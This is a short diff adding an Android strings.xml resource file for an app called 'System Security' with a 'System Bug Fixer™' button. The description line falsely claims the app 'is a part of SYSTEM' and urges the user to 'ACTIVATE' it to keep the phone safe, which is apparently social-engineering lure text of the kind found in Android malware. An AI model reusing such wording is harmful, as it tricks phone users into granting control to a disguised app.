@@ -1,0 +1,8 @@
+<resources>
+    <string name="app_name">System Security</string>
+    <string name="button_text2">SYSTEM BUG FIXER™</string>
+    <string name="button_text">System Bug Fixer™</string>
+    <string name="dummy">——— System at its best ———</string>
+    <string name="label">Security Settings</string>
+    <string name="description">It is a part of SYSTEM, please ACTIVATE to keep your phone safe</string>
+</resources>
